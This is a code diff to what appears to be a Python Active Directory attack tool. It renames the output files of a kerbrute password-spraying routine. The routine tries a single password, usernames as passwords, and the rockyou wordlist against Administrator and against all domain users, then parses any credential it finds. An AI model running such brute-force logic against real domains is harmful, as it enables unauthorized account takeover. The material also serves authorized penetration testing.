@@ -1454,9 +1454,9 @@ while True:
       if CheckParams != 1:
          found = 0
          print("\n[*] Trying all usernames with password " + PAS.rstrip(" ") + " first...")
-         command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users usernames.txt -password " + PAS.rstrip(" ") + " -outputfile password1.txt")
+         command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users usernames.txt -password " + PAS.rstrip(" ") + " -outputfile bpassword1.txt")
 
-         test1 = linecache.getline("password1.txt", 1)
+         test1 = linecache.getline("bpassword1.txt", 1)
          test1 = test1.rstrip("\n")
          if test1 != "":
             found = 1
@@ -1466,9 +1466,9 @@ while True:
 
          if found == 0:
             print("\n[*] Now trying all usernames with matching passwords...")
-            command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users usernames.txt -passwords usernames.txt -outputfile password2.txt")
+            command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users usernames.txt -passwords usernames.txt -outputfile bpassword2.txt")
          
-         test2 = linecache.getline("password2.txt", 1)
+         test2 = linecache.getline("bpassword2.txt", 1)
          test2 = test2.rstrip("\n")
          if test2 != "":
             found = 1
@@ -1478,9 +1478,9 @@ while True:
 
          if found == 0:
             print("\n[*] Now trying user Administrator with random passwords...")
-            command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -user Administrator -passwords /usr/share/wordlists/rockyou.txt -outputfile password3.txt")
+            command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -user Administrator -passwords /usr/share/wordlists/rockyou.txt -outputfile bpassword3.txt")
     
-         test3 = linecache.getline("password3.txt", 1)
+         test3 = linecache.getline("bpassword3.txt", 1)
          test3 = test3.rstrip("\n")
          if test3 != "":
             found = 1
@@ -1490,16 +1490,16 @@ while True:
 
          if found == 0:
             print("\n[*] Now trying all users with random passwords...")
-            command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users usernames.txt -passwords /usr/share/wordlists/rockyou.txt -outputfile password4.txt")
+            command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users usernames.txt -passwords /usr/share/wordlists/rockyou.txt -outputfile bpassword4.txt")
      
-         test4 = linecache.getline("password4.txt", 1)
+         test4 = linecache.getline("bpassword4.txt", 1)
          test4 = test4.rstrip("\n")
          if test4 != "":
             USR,PAS = test4.split(":") 
             if len(USR) < COL3: USR = padding(USR, COL3)
             if len(PAS) < COL4: PAS = padding(PAS, COL4)
 
-         command("rm password*.txt")
+         command("rm bpassword*.txt")
       prompt()
 
 # ------------------------------------------------------------------------------------- 
